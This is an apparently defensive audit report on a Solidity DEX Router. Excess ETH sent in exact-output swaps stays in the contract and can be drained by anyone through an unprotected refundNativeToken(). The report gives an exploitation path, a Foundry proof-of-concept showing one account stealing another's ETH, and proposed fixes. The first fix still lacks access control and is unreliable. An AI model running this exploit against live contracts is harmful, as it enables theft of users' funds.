## Title
Excess ETH Theft in Exact Output Swaps Due to Missing Access Control on refundNativeToken()

## Summary
In `Router.handleLockData`, when executing exact output swaps with ETH (where `params.isExactOut()` is true), the `value` variable is incorrectly set to 0 even when users send ETH via `msg.value`. This causes only the exact amount needed for the swap to be forwarded to the FlashAccountant, leaving excess ETH in the Router contract. The `refundNativeToken()` function in `PayableMulticallable` lacks access control, allowing any attacker to steal this excess ETH by calling the function immediately after a user's swap transaction.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- `src/Router.sol` - `handleLockData()` function (lines 106-146)
- `src/base/PayableMulticallable.sol` - `refundNativeToken()` function (lines 25-29)

**Intended Logic:** 
For exact output swaps with ETH, the Router should either: (1) only accept the exact amount of ETH needed and revert if excess is sent, or (2) automatically refund excess ETH to the user within the same transaction. The `refundNativeToken()` function is intended to allow users to recover their own excess ETH.

**Actual Logic:** 
The Router calculates the `value` parameter at line 106-110 using a ternary condition that requires `!params.isExactOut()`. When `isExactOut()` is true (negative amount for exact output swaps), `value` is set to 0 regardless of `msg.value`. This causes the settlement logic at lines 135-142 to only send the exact ETH amount needed to the FlashAccountant, leaving any excess `msg.value` in the Router contract. The `refundNativeToken()` function has no access control and sends the contract's entire ETH balance to `msg.sender`, enabling theft. [1](#0-0) [2](#0-1) [3](#0-2) 

**Exploitation Path:**
1. **User initiates exact output swap**: Alice calls `Router.swap()` with `msg.value = 1 ETH`, `poolKey.token0 = NATIVE_TOKEN_ADDRESS`, `isToken1 = false`, and `amount = -500000` (negative amount indicates exact output).

2. **Value miscalculation**: In `handleLockData`, the ternary at lines 106-110 evaluates to 0 because `!params.isExactOut()` is false, despite Alice sending 1 ETH.

3. **Partial ETH forwarding**: The swap executes and determines 0.4 ETH is needed. The settlement logic at lines 135-142 calculates `valueDifference = 0 - 0.4e18 = -0.4e18` (negative), so only 0.4 ETH is sent to FlashAccountant. The remaining 0.6 ETH stays in Router.

4. **Theft via refundNativeToken**: Bob (attacker) monitors the mempool, sees Alice's transaction, and immediately calls `refundNativeToken()`. Since there's no access control, Bob receives 0.6 ETH that belonged to Alice.

**Security Property Broken:** 
Violates the **Withdrawal Availability** invariant: "All positions MUST be withdrawable at any time." In this case, users' excess ETH cannot be safely withdrawn because an attacker can frontrun the legitimate owner.

## Impact Explanation
- **Affected Assets**: Native ETH sent by users during exact output swaps where `token0 = NATIVE_TOKEN_ADDRESS`
- **Damage Severity**: Users lose 100% of excess ETH sent beyond what's needed for the swap. For example, if a user sends 1 ETH but the swap only needs 0.4 ETH, the attacker steals 0.6 ETH (60% loss).
- **User Impact**: Any user performing exact output swaps with ETH is vulnerable. This is a common operation in DEX usage. Users who send conservative amounts of ETH to ensure swap success are most affected.

## Likelihood Explanation
- **Attacker Profile**: Any external account or contract can exploit this. MEV bots are ideally positioned to execute this attack by monitoring the mempool.
- **Preconditions**: 
  - Pool must be initialized with `token0 = NATIVE_TOKEN_ADDRESS`
  - User must perform exact output swap (negative amount) with `msg.value > required_amount`
  - Sufficient liquidity in the pool for the swap to succeed
- **Execution Complexity**: Extremely simple - single transaction calling `refundNativeToken()` immediately after victim's swap. Can be automated via MEV bot.
- **Frequency**: Exploitable on every exact output swap with excess ETH. Can be repeated continuously as long as users perform such swaps.

## Recommendation

**Option 1: Add access control to refundNativeToken()**
```solidity
// In src/base/PayableMulticallable.sol, lines 25-29:

// CURRENT (vulnerable):
function refundNativeToken() external payable {
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// FIXED:
function refundNativeToken(address recipient) external payable {
    if (address(this).balance != 0) {
        // Only allow refund to addresses that have actively used the contract
        // This requires tracking who sent ETH, or making this internal-only
        SafeTransferLib.safeTransferETH(recipient, address(this).balance);
    }
}
```

**Option 2: Auto-refund in handleLockData (RECOMMENDED)**
```solidity
// In src/Router.sol, after line 146 in handleLockData:

// Add automatic refund for exact output swaps with ETH
if (params.isExactOut() && !params.isToken1() && poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    // Calculate actual ETH used
    uint256 ethUsed = balanceUpdate.delta0() > 0 ? uint128(balanceUpdate.delta0()) : 0;
    
    // Refund any excess ETH to the swapper
    if (address(this).balance > 0) {
        SafeTransferLib.safeTransferETH(swapper, address(this).balance);
    }
}
```

**Option 3: Prevent excess ETH for exact output swaps**
```solidity
// In src/Router.sol, before line 106 in handleLockData:

// For exact output swaps with ETH, msg.value should be 0
if (params.isExactOut() && !params.isToken1() && poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    require(msg.value == 0, "ExactOut swaps with ETH should use token approval, not msg.value");
}
```

## Proof of Concept
```solidity
// File: test/Exploit_ExcessETHTheft.t.sol
// Run with: forge test --match-test test_ExcessETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "./FullTest.sol";

contract Exploit_ExcessETHTheft is FullTest {
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    
    function setUp() public {
        // Initialize protocol state with ETH pool
    }
    
    function test_ExcessETHTheft() public {
        // SETUP: Create ETH pool and add liquidity
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        createPosition(poolKey, -100, 100, 1000 ether, 1000 ether);
        
        // Give Alice some ETH
        vm.deal(alice, 10 ether);
        
        // EXPLOIT: Alice performs exact output swap with excess ETH
        vm.startPrank(alice);
        uint256 aliceBalanceBefore = alice.balance;
        
        // Alice wants exactly 0.5 token1 out, sends 1 ETH (more than needed)
        router.swap{value: 1 ether}(
            poolKey,
            false, // isToken1 = false (swapping token0/ETH)
            -0.5 ether, // negative = exact output
            SqrtRatio.wrap(0),
            0,
            type(int256).min
        );
        
        uint256 aliceBalanceAfter = alice.balance;
        uint256 aliceETHSpent = aliceBalanceBefore - aliceBalanceAfter;
        vm.stopPrank();
        
        // Check Router has excess ETH
        uint256 routerBalance = address(router).balance;
        assertGt(routerBalance, 0, "Router should have excess ETH");
        
        // ATTACK: Bob steals the excess ETH
        vm.prank(bob);
        uint256 bobBalanceBefore = bob.balance;
        router.refundNativeToken();
        uint256 bobBalanceAfter = bob.balance;
        
        // VERIFY: Bob successfully stole Alice's excess ETH
        uint256 stolen = bobBalanceAfter - bobBalanceBefore;
        assertEq(stolen, routerBalance, "Bob stole all excess ETH");
        assertGt(stolen, 0, "Vulnerability confirmed: Bob stole Alice's ETH");
        assertEq(address(router).balance, 0, "Router balance drained");
    }
}
```

## Notes
This vulnerability is particularly dangerous because:
1. **Silent fund loss**: Users won't realize their excess ETH is being stolen
2. **MEV extractable**: Bots can systematically monitor and exploit every vulnerable transaction
3. **No reversion**: The swap succeeds normally, making the theft harder to detect
4. **Common pattern**: Exact output swaps are frequently used in production DEXs

The root cause is the mismatch between how the Router calculates `value` (set to 0 for exact output) and how users naturally send ETH via `msg.value` for safety margins. Combined with the unprotected `refundNativeToken()`, this creates a direct theft vector.

### Citations

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L133-146)
```text
                    if (balanceUpdate.delta0() != 0) {
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
